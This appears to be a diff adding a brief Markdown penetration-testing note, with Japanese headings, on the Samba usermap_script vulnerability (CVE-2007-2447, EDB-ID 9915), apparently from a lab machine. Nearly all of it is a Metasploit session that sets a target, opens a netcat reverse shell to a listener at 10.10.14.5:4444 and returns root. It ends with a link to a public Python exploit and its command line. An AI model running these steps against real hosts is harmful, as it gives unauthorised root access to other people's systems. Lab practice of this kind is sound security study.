@@ -1,0 +1,49 @@
+## 脆弱性
+- EDB-ID 9915
+## Msfconsole
+```
+kali@kali:~$ msfconsole
+msf5 > use exploit/multi/samba/usermap_script
+[*] No payload configured, defaulting to cmd/unix/reverse_netcat
+msf5 exploit(multi/samba/usermap_script) > options
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   139              yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.14.5       yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf5 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3
+rhosts => 10.10.10.3
+msf5 exploit(multi/samba/usermap_script) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.5:4444 
+[*] Command shell session 1 opened (10.10.14.5:4444 -> 10.10.10.3:58966) at 2020-08-27 00:51:57 -0400
+
+whoami
+root
+```
+## PoC
+- URL
+  - `https://github.com/amriunix/CVE-2007-2447`
+- exploit
+  ```
+  python usermap_script.py <RHOST> <RPORT> <LHOST> <LPORT>
+  ```
